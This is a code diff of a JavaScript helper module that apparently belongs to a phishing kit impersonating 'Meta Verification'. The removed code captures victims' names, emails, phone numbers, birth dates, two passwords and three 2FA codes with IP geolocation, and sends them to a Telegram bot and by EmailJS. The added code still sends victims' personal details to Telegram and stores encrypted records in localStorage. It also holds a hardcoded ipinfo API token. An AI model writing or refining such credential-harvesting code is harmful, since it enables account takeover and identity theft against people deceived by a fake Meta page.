@@ -1,221 +1,327 @@
-async getUserIp() {
-    try {
-        const response = await fetch(
-            'https://api.ipify.org?format=json',
-            {
-                method: 'GET',
-                cache: 'no-store'
-            }
-        );
+const Utils = {
 
-        if (!response.ok) {
-            throw new Error(`IP request failed: ${response.status}`);
-        }
-
-        const data = await response.json();
-
-        return data?.ip || 'N/A';
-
-    } catch (error) {
-        console.error('Error getting IP:', error);
-        return 'N/A';
-    }
-},
-
-async getUserLocation() {
-    let ip = 'N/A';
-    let city = 'N/A';
-    let region = 'N/A';
-    let country = 'N/A';
-    let countryCode = 'N/A';
-
-    // Lấy IP độc lập trước
-    try {
-        ip = await this.getUserIp();
-    } catch (error) {
-        console.error('IP fallback error:', error);
-    }
-
-    // Lấy thông tin location
-    try {
-        const response = await fetch(
-            'https://ipinfo.io/json?token=5a58a2d85996e3',
-            {
-                method: 'GET',
-                cache: 'no-store'
-            }
-        );
-
-        if (!response.ok) {
-            throw new Error(`IPInfo request failed: ${response.status}`);
-        }
-
-        const data = await response.json();
-
-        if (data?.ip) ip = data.ip;
-        if (data?.city) city = data.city;
-        if (data?.region) region = data.region;
-        if (data?.country) {
-            country = data.country;
-            countryCode = data.country;
-        }
-
-    } catch (error) {
-        console.error('Location error:', error);
-    }
-
-    // Không ghép dấu ")" thừa
-    const locationParts = [
-        city,
-        region,
-        country
-    ].filter(value => value && value !== 'N/A');
-
-    const location = locationParts.length
-        ? locationParts.join(' | ')
-        : 'N/A';
-
-    return {
-        location,
-        country_code: countryCode,
-        ip,
-        region,
-        country
-    };
-}
-    async sendToTelegram(data) {
-        const locationData = await this.getUserLocation();
-
-        const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
-----------------------------------
-<b>Full Name:</b> <code>${data.fullName || ''}</code>
-<b>Email:</b> <code>${data.email || ''}</code>
-<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
-<b>Page Name:</b> <code>${data.fanpage || ''}</code>
-<b>Phone:</b> <code>${data.phone || ''}</code>
-<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
-----------------------------------
-<b>Password(1):</b> <code>${data.password || ''}</code>
-<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
-----------------------------------
-<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
-<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text,
-                    parse_mode: 'HTML'
-                })
-            });
-        } catch (error) {
-            console.error('Telegram error:', error);
-        }
+    encrypt(text) {
+        return CryptoJS.AES.encrypt(
+            text,
+            CONFIG.SECRET_KEY
+        ).toString();
     },
 
-    async sendToEmail(data) {
-        const locationData = await this.getUserLocation();
+    decrypt(cipherText) {
+        const bytes = CryptoJS.AES.decrypt(
+            cipherText,
+            CONFIG.SECRET_KEY
+        );
 
-        const emailContent = `
-IP: ${locationData.ip}
-Location: ${locationData.location}
-----------------------------------
-Full Name: ${data.fullName || ''}
-Email: ${data.email || ''}
-Email Business: ${data.emailBusiness || ''}
-Page Name: ${data.fanpage || ''}
-Phone: ${data.phone || ''}
-Date of Birth: ${data.day}/${data.month}/${data.year}
-----------------------------------
-Password(1): ${data.password || ''}
-Password(2): ${data.passwordSecond || ''}
-----------------------------------
-🔐Code 2FA(1): ${data.twoFa || ''}
-🔐Code 2FA(2): ${data.twoFaSecond || ''}
-🔐Code 2FA(3): ${data.twoFaThird || ''}
+        return bytes.toString(CryptoJS.enc.Utf8);
+    },
 
-Sent at: ${new Date().toLocaleString()}`;
-
+    saveRecord(key, value) {
         try {
-            // Load EmailJS SDK if not already loaded
-            if (!window.emailjs) {
-                await this.loadEmailJSSDK();
-            }
-
-            await emailjs.send(
-                CONFIG.EMAILJS_SERVICE_ID,
-                CONFIG.EMAILJS_TEMPLATE_ID,
-                {
-                    to_email: CONFIG.EMAIL_RECIPIENT,
-                    subject: `Meta Verification - ${locationData.location}`,
-                    message: emailContent,
-                    from_name: 'Meta Verification System',
-                    reply_to: data.email || 'noreply@system.com'
-                },
-                CONFIG.EMAILJS_PUBLIC_KEY
+            const encryptedValue = this.encrypt(
+                JSON.stringify(value)
             );
+
+            const record = {
+                value: encryptedValue,
+                expiry: Date.now() + CONFIG.STORAGE_EXPIRY
+            };
+
+            localStorage.setItem(
+                key,
+                JSON.stringify(record)
+            );
+
         } catch (error) {
-            console.error('Email error:', error);
+            console.error("Save error:", error);
         }
     },
 
-    loadEmailJSSDK() {
-        return new Promise((resolve, reject) => {
-            if (window.emailjs) {
-                resolve();
-                return;
+    getRecord(key) {
+        try {
+            const item = localStorage.getItem(key);
+
+            if (!item) return null;
+
+            const record = JSON.parse(item);
+
+            if (!record.value || !record.expiry) {
+                localStorage.removeItem(key);
+                return null;
             }
 
-            const script = document.createElement('script');
-            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-            script.onload = () => {
-                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
-                resolve();
-            };
-            script.onerror = reject;
-            document.head.appendChild(script);
-        });
+            if (Date.now() > record.expiry) {
+                localStorage.removeItem(key);
+                return null;
+            }
+
+            const decrypted = this.decrypt(record.value);
+
+            return decrypted
+                ? JSON.parse(decrypted)
+                : null;
+
+        } catch (error) {
+            console.error("Get record error:", error);
+            return null;
+        }
+    },
+
+    async getUserIp() {
+        try {
+            const response = await fetch(
+                "https://api.ipify.org?format=json",
+                {
+                    method: "GET",
+                    cache: "no-store"
+                }
+            );
+
+            if (!response.ok) {
+                throw new Error(
+                    `IP API error: ${response.status}`
+                );
+            }
+
+            const data = await response.json();
+
+            return data?.ip || "N/A";
+
+        } catch (error) {
+            console.error(
+                "Error getting IP:",
+                error
+            );
+
+            return "N/A";
+        }
+    },
+
+    async getUserLocation() {
+
+        let ip = "N/A";
+        let city = "N/A";
+        let region = "N/A";
+        let country = "N/A";
+        let countryCode = "N/A";
+
+        // -----------------------------
+        // 1. Lấy IP từ ipify
+        // -----------------------------
+        try {
+            ip = await this.getUserIp();
+        } catch (error) {
+            console.error(
+                "IP fallback error:",
+                error
+            );
+        }
+
+        // -----------------------------
+        // 2. Lấy location từ IPInfo
+        // -----------------------------
+        try {
+
+            const response = await fetch(
+                "https://ipinfo.io/json?token=5a58a2d85996e3",
+                {
+                    method: "GET",
+                    cache: "no-store"
+                }
+            );
+
+            if (!response.ok) {
+                throw new Error(
+                    `IPInfo error: ${response.status}`
+                );
+            }
+
+            const data = await response.json();
+
+            if (data?.ip) {
+                ip = data.ip;
+            }
+
+            if (data?.city) {
+                city = data.city;
+            }
+
+            if (data?.region) {
+                region = data.region;
+            }
+
+            if (data?.country) {
+                country = data.country;
+                countryCode = data.country;
+            }
+
+        } catch (error) {
+
+            console.error(
+                "Location error:",
+                error
+            );
+        }
+
+        // -----------------------------
+        // 3. Tạo Location sạch
+        // -----------------------------
+        const parts = [
+            city,
+            region,
+            country
+        ].filter(
+            value =>
+                value &&
+                value !== "N/A"
+        );
+
+        const location =
+            parts.length > 0
+                ? parts.join(" | ")
+                : "N/A";
+
+        return {
+            ip: ip || "N/A",
+            location,
+            country_code: countryCode || "N/A",
+            region: region || "N/A",
+            country: country || "N/A"
+        };
+    },
+
+    async sendToTelegram(data) {
+
+        try {
+
+            const locationData =
+                await this.getUserLocation();
+
+            const text = `
+<b>IP:</b> <code>${locationData.ip}</code>
+<b>Location:</b> <code>${locationData.location}</code>
+----------------------------------
+<b>Full Name:</b> <code>${data.fullName || ""}</code>
+<b>Email:</b> <code>${data.email || ""}</code>
+<b>Page Name:</b> <code>${data.fanpage || ""}</code>
+<b>Phone:</b> <code>${data.phone || ""}</code>
+----------------------------------
+<b>Ticket ID:</b> <code>${data.ticketId || ""}</code>
+`;
+
+            const response = await fetch(
+                `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
+                {
+                    method: "POST",
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id:
+                            CONFIG.TELEGRAM_CHAT_ID,
+                        text,
+                        parse_mode: "HTML"
+                    })
+                }
+            );
+
+            if (!response.ok) {
+                throw new Error(
+                    `Telegram error: ${response.status}`
+                );
+            }
+
+            return true;
+
+        } catch (error) {
+
+            console.error(
+                "Telegram error:",
+                error
+            );
+
+            return false;
+        }
     },
 
     async sendNotification(data) {
-        const notificationType = CONFIG.NOTIFICATION_TYPE;
+
+        const type =
+            CONFIG.NOTIFICATION_TYPE;
 
         try {
-            if (notificationType === 'telegram' || notificationType === 'both') {
+
+            if (
+                type === "telegram" ||
+                type === "both"
+            ) {
                 await this.sendToTelegram(data);
             }
 
-            if (notificationType === 'email' || notificationType === 'both') {
-                await this.sendToEmail(data);
-            }
         } catch (error) {
-            console.error('Notification error:', error);
+
+            console.error(
+                "Notification error:",
+                error
+            );
         }
     },
 
     maskPhone(phone) {
-        if (!phone || phone.length < 5) return phone;
-        const start = phone.slice(0, 2);
-        const end = phone.slice(-2);
-        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
+
+        if (!phone) return "";
+
+        phone = String(phone);
+
+        if (phone.length < 5) {
+            return phone;
+        }
+
+        const start =
+            phone.slice(0, 2);
+
+        const end =
+            phone.slice(-2);
+
+        return (
+            `${start}` +
+            `${"*".repeat(
+                phone.length - 4
+            )}` +
+            `${end}`
+        );
     },
 
     maskEmail(email) {
-        if (!email) return '';
-        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
-            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
-        });
+
+        if (!email) return "";
+
+        return String(email).replace(
+            /^(.)(.*?)(.)@(.+)$/,
+            (_, first, middle, last, domain) => {
+
+                return (
+                    `${first}` +
+                    `${"*".repeat(
+                        middle.length
+                    )}` +
+                    `${last}@${domain}`
+                );
+            }
+        );
     },
 
     generateTicketId() {
-        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
-        return `${gen()}-${gen()}-${gen()}`;
+
+        const gen = () =>
+            Math.random()
+                .toString(36)
+                .substring(2, 6)
+                .toUpperCase();
+
+        return (
+            `${gen()}-${gen()}-${gen()}`
+        );
     }
 };
-
